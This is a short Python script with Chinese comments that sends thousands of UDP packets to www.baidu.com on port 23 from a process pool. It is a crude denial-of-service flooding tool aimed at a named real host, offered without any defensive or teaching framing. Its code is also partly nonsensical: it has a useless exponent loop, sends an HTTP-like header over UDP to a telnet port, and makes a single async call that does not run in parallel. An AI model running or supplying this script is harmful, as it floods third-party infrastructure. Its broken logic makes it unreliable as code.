#导入模块
import socket
import time
from multiprocessing import Pool


MAX_CONN = 10000#设置最大连接次数
PORT = 23#设置端口
HOST = 'www.baidu.com'#目标网址

date = 100
for i in range(date):
    date_r = pow(date, date)


date = (#构造数据包
"HOST:%s\n"
"Content-Length:%s\r\n"
% (HOST, date))


def Conn_thread():

    for i in range(0, MAX_CONN):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  #设置UDP模式连接

        try:
            s.connect((HOST, PORT))
            s.send(date.encode(encoding='utf-8', errors='strict'))#设置编码问题
            print('Send date OK!, conn=%d\n' % i)
        except Exception as ex: #设置报错信息
            print("Could not connect to server or send error: %s" % ex)
            time.sleep(1)#当发生错误时，停止1秒


if __name__ == '__main__':
    p = Pool(5) #设置进程池最大进程数
    res = p.apply_async(Conn_thread, args=())#异步传输
    p.close()
    p.join()
